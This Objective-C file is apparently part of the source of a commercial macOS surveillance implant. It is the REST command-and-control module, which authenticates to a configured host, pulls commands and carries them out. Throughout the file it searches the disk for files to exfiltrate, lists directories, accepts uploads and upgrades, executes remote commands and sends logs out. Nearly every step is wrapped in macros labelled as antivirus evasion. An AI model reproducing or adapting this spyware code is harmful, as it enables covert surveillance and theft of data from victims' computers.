/*
 * RCSMac - RESTNetworkProtocol
 *  Implementation for REST Protocol.
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */
#import "RCSMCommon.h"

#import "RESTNetworkProtocol.h"
#import "RESTTransport.h"

#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ConfNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "UploadNetworkOperation.h"
#import "UpgradeNetworkOperation.h"
#import "FSNetworkOperation.h"
#import "SizeNetworkOperation.h"  //TODO: delete this one when put inside LogNetworkOperation
#import "LogNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "CommandsNetworkOperation.h"

#import "RCSMFileSystemManager.h"
#import "RCSMTaskManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation RESTNetworkProtocol

- (id)initWithConfiguration: (NSData *)aConfiguration
{
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (self = [super init])
    {
      if (aConfiguration == nil)
        {        
          [self release];
          return nil;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      syncStruct *header  = (syncStruct *)[aConfiguration bytes];
      mMinDelay           = header->minSleepTime;
      mMaxDelay           = header->maxSleepTime;
      mBandwidthLimit     = header->bandwidthLimit;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      NSString *host      = [NSString stringWithCString: header->configString
                                               encoding: NSUTF8StringEncoding];
      
#ifdef DEBUG_PROTO
      warnLog(@"minDelay  : %d", mMinDelay);
      warnLog(@"maxDelay  : %d", mMaxDelay);
      warnLog(@"bandWidth : %d", mBandwidthLimit);
      warnLog(@"host      : %@", host);
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      NSString *_url;
      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
      mURL    = [[NSURL alloc] initWithString: _url];
      [_url release];
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)perform
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Init the transport
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Done.
  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc] initWithTransport: transport];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([authOP perform] == NO)
    { 
      [authOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  [authOP release];
  //
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Done.
  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc] initWithTransport: transport];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if ([idOP perform] == NO)
    {
      [idOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableArray *commandList = [[idOP getCommands] retain];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [idOP release];
  //
  
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  for (; i < [commandList count]; i++)
    {
      uint32_t command = [[commandList objectAtIndex: i] unsignedIntValue];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      switch (command)
        {
          // Done.
          case PROTO_NEW_CONF:
            {     
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc] initWithTransport: transport];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              if ([confOP perform] == NO)
                {
                  // AV evasion: only on release build
                  AV_GARBAGE_003
                
                  [confOP sendConfAck: PROTO_NO];
                }
              else
                [confOP sendConfAck: PROTO_OK];
                
              [confOP release];
            } break;
          case PROTO_DOWNLOAD:
            {
              // AV evasion: only on release build
              AV_GARBAGE_000
            
              DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                  initWithTransport: transport];
              
              // AV evasion: only on release build
              AV_GARBAGE_008
              
              if ([downOP perform] == NO)
                {
#ifdef DEBUG_PROTO
                  errorLog(@"Error on DOWNLOAD");
#endif
                }
              else
                {
                  NSArray *files = [downOP getDownloads];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  if ([files count] > 0)
                    {
                      // AV evasion: only on release build
                      AV_GARBAGE_002
                      
                      __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                      
                      // AV evasion: only on release build
                      AV_GARBAGE_009
                      
                      for (NSString *fileMask in files)
                        {
                          // AV evasion: only on release build
                          AV_GARBAGE_004
                        
                          NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
                          if (filesFound == nil)
                            {
#ifdef DEBUG_PROTO
                              errorLog(@"fileMask (%@) didn't match any files");
#endif
                              
                              // AV evasion: only on release build
                              AV_GARBAGE_007
                              
                              continue;
                            }
                          
                          for (NSString *file in filesFound)
                            {
#ifdef DEBUG_PROTO
                              infoLog(@"createLogForFile (%@)", file);
#endif
                              
                              // AV evasion: only on release build
                              AV_GARBAGE_001
                              
                              [fsManager logFileAtPath: file
                                            forAgentID: LOG_DOWNLOAD];
                            }
                        }
                      
                      // AV evasion: only on release build
                      AV_GARBAGE_008
                      
                      [fsManager release];
                    }
                  else
                    {
#ifdef DEBUG_PROTO
                      errorLog(@"(PROTO_DOWNLOAD) no file available");
#endif
                    }
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              [downOP release];
            } break;
          case PROTO_UPLOAD:
            {
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                              initWithTransport: transport];
              
              // AV evasion: only on release build
              AV_GARBAGE_005
              
              if ([upOP perform] == NO)
                {
#ifdef DEBUG_PROTO
                  errorLog(@"Error on UPLOAD");
#endif
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_009
              
              [upOP release];
            } break;
          case PROTO_UPGRADE:
            {
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              UpgradeNetworkOperation *upgradeOP = [[UpgradeNetworkOperation alloc]
                                                    initWithTransport: transport];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              if ([upgradeOP perform] == NO)
                {
#ifdef DEBUG_PROTO
                  errorLog(@"Error on UPGRADE");
#endif
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              [upgradeOP release];
            } break;
          case PROTO_FILESYSTEM:
            {
              // AV evasion: only on release build
              AV_GARBAGE_004
              
              FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
                                          initWithTransport: transport];
              
              // AV evasion: only on release build
              AV_GARBAGE_006
              
              if ([fsOP perform] == NO)
                {
#ifdef DEBUG_PROTO
                  errorLog(@"Error on FS");
#endif
                }
              else
                {
                  NSArray *paths = [fsOP getPaths];
#ifdef DEBUG_PROTO
                  infoLog(@"paths: %@", paths);
#endif
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  if ([paths count] > 0)
                    {
                      // AV evasion: only on release build
                      AV_GARBAGE_009
                      
                      __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                      
                      // AV evasion: only on release build
                      AV_GARBAGE_008
                      
                      for (NSDictionary *dictionary in paths)
                        {
                          NSString *path = [dictionary objectForKey: @"path"];
                          uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
                          
#ifdef DEBUG_PROTO
                          infoLog(@"(PROTO_FS) path : %@", path);
                          infoLog(@"(PROTO_FS) depth: %d", depth);
#endif
                          
                          // AV evasion: only on release build
                          AV_GARBAGE_006
                          
                          [fsManager logDirContent: path
                                         withDepth: depth];
                        }
                      
                      // AV evasion: only on release build
                      AV_GARBAGE_007
                      
                      [fsManager release];
                    }
                  else
                    {
#ifdef DEBUG_PROTO
                      errorLog(@"(PROTO_FS) no path availalble");
#endif
                    }
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_005
              
              [fsOP release];
            } break;
          case PROTO_COMMANDS:
          {
            CommandsNetworkOperation *commOP = [[CommandsNetworkOperation alloc] initWithTransport: transport];
            
            if ([commOP perform] == NO)
            {
#ifdef DEBUG_PROTO
              errorLog(@"Error on COMMANDS");
#endif
            }
            else
            {
              [commOP executeCommands];
            }
            
          } break;
          default:
            break;
        }
    }
  
    
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport
                                         minDelay: mMinDelay
                                         maxDelay: mMaxDelay
                                        bandwidth: mBandwidthLimit];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([logOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on LOG");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [logOP release];
  
  ByeNetworkOperation *byeOP = [[ByeNetworkOperation alloc]
                                initWithTransport: transport];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([byeOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"WTF error on BYE?!");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [byeOP release];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //
  // Time to reload the configuration, if needed
  // TODO: Refactor this
  //
  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (_taskManager.mShouldReloadConfiguration == YES)
    {
      [_taskManager reloadConfiguration];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [commandList release];
  [transport release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return YES;
}
// End Of Abstract Class Methods

@end
